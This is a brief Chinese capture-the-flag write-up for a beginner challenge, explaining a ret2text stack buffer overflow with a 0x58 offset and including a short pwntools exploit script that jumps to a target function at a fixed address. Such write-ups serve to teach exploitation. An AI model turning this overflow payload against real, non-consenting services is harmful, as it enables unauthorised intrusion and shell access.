# week1pwn2

## 题目简述

程序存在栈缓冲区溢出，题目提示 `ret2text`。二进制中已有可直接获得 shell 或输出 flag 的目标函数，因此只需覆盖返回地址跳转到 `0x40123a`。

## 解题过程

反汇编可确认输入缓冲区大小为 `0x50`，其后是 8 字节保存的 `rbp`，所以从缓冲区起始到返回地址的偏移为 `0x58`。覆盖返回地址为目标函数地址即可：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
s.sendlineafter(
    b'do you know ret2text?\n',
    b'a' * 0x50 + b'b' * 0x8 + p64(0x40123a)
)
s.interactive()
~~~

若本地调试，应先核对 PIE 是否关闭；这里使用固定代码地址的前提正是程序基址不随机化。

## 方法总结

- 核心方法：利用栈溢出覆盖返回地址，直接跳转到程序已有的目标函数。
- 识别特征：题目明确提示 `ret2text`，目标函数位于主程序 `.text` 段，且无需泄漏 libc。
- 注意事项：偏移应由栈帧或循环模式验证；固定地址只在 PIE 关闭时成立，远程地址应使用平台动态提供的 `HOST`、`PORT`。
